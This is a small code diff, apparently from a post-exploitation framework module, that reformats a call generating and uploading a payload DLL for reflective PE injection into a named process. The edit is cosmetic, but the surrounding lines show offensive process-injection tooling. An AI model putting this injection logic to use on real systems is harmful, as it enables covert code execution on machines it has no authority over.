@@ -72,9 +72,7 @@ class Module:
 
         script_end += f"Invoke-ReflectivePEInjection -PEPath {full_upload_path} -ProcName {proc_name} "
         dll = main_menu.stagergenv2.generate_dll(launcher_code, arch)
-        upload_script = main_menu.stagergenv2.generate_upload(
-                    dll, full_upload_path
-                )
+        upload_script = main_menu.stagergenv2.generate_upload(dll, full_upload_path)
 
         script += "\r\n"
         script += upload_script
